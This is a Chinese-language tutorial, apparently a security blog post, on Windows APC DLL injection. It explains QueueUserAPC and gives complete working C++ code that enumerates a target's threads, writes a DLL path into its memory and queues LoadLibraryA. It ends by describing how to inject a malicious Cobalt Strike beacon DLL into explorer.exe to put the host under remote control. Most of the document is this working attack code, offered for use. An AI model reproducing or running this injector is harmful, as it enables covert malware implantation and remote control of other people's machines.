@@ -1,0 +1,295 @@
+## 什么是APC
+APC 是一个简称，全称为Asynchronous Procedure
+Call，叫异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。
+MSDN解释为：
+### 相关函数
+`QueueUserApc`：函数作用,添加制定的异步函数调用(回调函数)到执行的线程的APC队列中
+`APCproc`：函数作用: 回调函数的写法.
+### 核心函数
+**QueueUserAPC**
+    DWORD QueueUserAPC(
+    PAPCFUNCpfnAPC, // APC function
+    HANDLEhThread, // handle to thread
+    ULONG_PTRdwData // APC function parameter
+    );
+参数1表示执行函数的地址，当开始执行该APC的时候，程序会跳转到该函数地址处来执行。
+参数2表示插入APC的线程句柄，要求线程句柄必须包含`THREAD_SET_CONTEXT` 访问权限。
+参数3表示传递给执行函数的参数，与远线程注入类似，如果`QueueUserAPC`
+的第一个参数为`LoadLibraryA`，第三个参数设置的是dll路径即可完成dll注入。
+## 实现原理
+往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC
+介绍一下应用程序的APC
+APC是往线程中插入一个回调函数,但是用的APC调用这个回调函数是有条件的.在Msdn的写法如下
+上面说到要要使用`SleepEx`,`signalObjectAndWait`.....等等这些函数才会触发。
+这就有了APC注入的条件：
+1.必须是多线程环境下
+2.注入的程序必须会调用上面的那些同步对象.
+### 注入方法原理
+1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断
+2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数
+3.我们利用QueueUserApc,往这个队列中插入一个回调
+4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去
+### 使用方法
+1.利用快照枚举所有的线程
+2.写入远程内存,写入的是Dll的路径
+3.插入我们的DLL即可
+## 实现过程
+编写一个根据进程名获取pid的函数，然后根据PID获取所有的线程ID，这里我就将两个函数集合在一起，通过自己输入PID来获取指定进程的线程并写入数组
+    //列出指定进程的所有线程
+    BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
+    {
+        // 申请空间
+        DWORD dwThreadIdListLength = 0;
+        DWORD dwThreadIdListMaxCount = 2000;
+        LPDWORD pThreadIdList = NULL;
+        HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
+        pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (pThreadIdList == NULL)
+        {
+            return FALSE;
+        }
+        RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
+        THREADENTRY32 th32 = { 0 };
+        // 拍摄快照
+        hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
+        if (hThreadSnap == INVALID_HANDLE_VALUE)
+        {
+            return FALSE;
+        }
+        // 结构的大小
+        th32.dwSize = sizeof(THREADENTRY32);
+        // 遍历所有THREADENTRY32结构, 按顺序填入数组
+        BOOL bRet = Thread32First(hThreadSnap, &th32);
+        while (bRet)
+        {
+            if (th32.th32OwnerProcessID == th32ProcessID)
+            {
+                if (dwThreadIdListLength >= dwThreadIdListMaxCount)
+                {
+                    break;
+                }
+                pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
+            }
+            bRet = Thread32Next(hThreadSnap, &th32);
+        }
+        *pThreadIdListLength = dwThreadIdListLength;
+        *ppThreadIdList = pThreadIdList;
+        return TRUE;
+    }
+然后是apc注入的主函数，首先使用`VirtualAllocEx`远程申请内存
+    BOOL APCInject(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)
+    {
+        // 申请内存
+        PVOID lpAddr = NULL;
+        SIZE_T page_size = 4096;
+        lpAddr = ::VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (lpAddr == NULL)
+        {
+            ShowError("VirtualAllocEx - Error\n\n");
+            VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+        // 把Dll的路径复制到内存中
+        if (FALSE == ::WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr))
+        {
+            ShowError("WriteProcessMemory - Error\n\n");
+            VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+        // 获得LoadLibraryA的地址
+        PVOID loadLibraryAddress = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        // 遍历线程, 插入APC
+        float fail = 0;
+        for (int i = dwThreadIdListLength - 1; i >= 0; i--)
+        {
+            // 打开线程
+            HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
+            if (hThread)
+            {
+                // 插入APC
+                if (!::QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))
+                {
+                    fail++;
+                }
+                // 关闭线程句柄
+                ::CloseHandle(hThread);
+                hThread = NULL;
+            }
+        }
+使用`WriteProcessMemory`把dll路径写入内存
+    ::WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr)
+获取`LoadLibraryA`的地址
+    PVOID loadLibraryAddress = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+便利线程并插入APC，这里定义一个fail并进行判断，如果`QueueUserAPC`返回的值为NULL则线程遍历失败，fail的值就+1
+    for (int i = dwThreadIdListLength - 1; i >= 0; i--)
+        {
+            // 打开线程
+            HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
+            if (hThread)
+            {
+                // 插入APC
+                if (!::QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))
+                {
+                    fail++;
+                }
+            }
+        }
+主函数，定义dll地址
+    strcpy_s(wzDllFullPath, "加载要注入的dll的路径");
+使用`OpenProcess`打开句柄
+    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);
+调用前面写好的`APCInject`函数实现APC注入
+    if (!APCInject(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))
+        {
+            printf("Failed to inject DLL\n");
+            return FALSE;
+        }
+采用手动输入的方式，通过`cin >> ulProcessID`将接收到的参数赋给`ulProcessID`
+## 利用此方法上线CS
+### 完整代码
+    // inject3.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
+    #include 
+    #include
+    #include
+    using namespace std;
+    void ShowError(const char* pszText)
+    {
+        char szError[MAX_PATH] = { 0 };
+        ::wsprintf(szError, "%s Error[%d]\n", pszText, ::GetLastError());
+        ::MessageBox(NULL, szError, "ERROR", MB_OK);
+    }
+    //列出指定进程的所有线程
+    BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
+    {
+        // 申请空间
+        DWORD dwThreadIdListLength = 0;
+        DWORD dwThreadIdListMaxCount = 2000;
+        LPDWORD pThreadIdList = NULL;
+        HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
+        pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (pThreadIdList == NULL)
+        {
+            return FALSE;
+        }
+        RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
+        THREADENTRY32 th32 = { 0 };
+        // 拍摄快照
+        hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
+        if (hThreadSnap == INVALID_HANDLE_VALUE)
+        {
+            return FALSE;
+        }
+        // 结构的大小
+        th32.dwSize = sizeof(THREADENTRY32);
+        //遍历所有THREADENTRY32结构, 按顺序填入数组
+        BOOL bRet = Thread32First(hThreadSnap, &th32);
+        while (bRet)
+        {
+            if (th32.th32OwnerProcessID == th32ProcessID)
+            {
+                if (dwThreadIdListLength >= dwThreadIdListMaxCount)
+                {
+                    break;
+                }
+                pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
+            }
+            bRet = Thread32Next(hThreadSnap, &th32);
+        }
+        *pThreadIdListLength = dwThreadIdListLength;
+        *ppThreadIdList = pThreadIdList;
+        return TRUE;
+    }
+    BOOL APCInject(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)
+    {
+        // 申请内存
+        PVOID lpAddr = NULL;
+        SIZE_T page_size = 4096;
+        lpAddr = ::VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (lpAddr == NULL)
+        {
+            ShowError("VirtualAllocEx - Error\n\n");
+            VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+        // 把Dll的路径复制到内存中
+        if (FALSE == ::WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr))
+        {
+            ShowError("WriteProcessMemory - Error\n\n");
+            VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+        // 获得LoadLibraryA的地址
+        PVOID loadLibraryAddress = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        // 遍历线程, 插入APC
+        float fail = 0;
+        for (int i = dwThreadIdListLength - 1; i >= 0; i--)
+        {
+            // 打开线程
+            HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
+            if (hThread)
+            {
+                // 插入APC
+                if (!::QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))
+                {
+                    fail++;
+                }
+                // 关闭线程句柄
+                ::CloseHandle(hThread);
+                hThread = NULL;
+            }
+        }
+        printf("Total Thread: %d\n", dwThreadIdListLength);
+        printf("Total Failed: %d\n", (int)fail);
+        if ((int)fail == 0 || dwThreadIdListLength / fail > 0.5)
+        {
+            printf("Success to Inject APC\n");
+            return TRUE;
+        }
+        else
+        {
+            printf("Inject may be failed\n");
+            return FALSE;
+        }
+    }
+    int main()
+    {
+        ULONG32 ulProcessID = 0;
+        printf("Input the Process ID:");
+        cin >> ulProcessID;
+        CHAR wzDllFullPath[MAX_PATH] = { 0 };
+        LPDWORD pThreadIdList = NULL;
+        DWORD dwThreadIdListLength = 0;
+    #ifndef _WIN64
+        strcpy_s(wzDllFullPath, "加载要注入的dll的路径");
+    #else // _WIN64
+        strcpy_s(wzDllFullPath, "加载要注入的dll的路径");
+    #endif
+        if (!GetProcessThreadList(ulProcessID, &pThreadIdList, &dwThreadIdListLength))
+        {
+            printf("Can not list the threads\n");
+            exit(0);
+        }
+        //打开句柄
+        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);
+        if (hProcess == NULL)
+        {
+            printf("Failed to open Process\n");
+            return FALSE;
+        }
+        //注入
+        if (!APCInject(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))
+        {
+            printf("Failed to inject DLL\n");
+            return FALSE;
+        }
+        return 0;
+    }
+### 上线cs
+首先CS建立监听，生成一个恶意dll文件
+在目标机上运行编译好的exe文件，并输入要注入进程的PID,这里我使用explorer.exe测试
+编译，输入PID
+查看CS，已经成功上线，且进程也加载了beacon.dll.
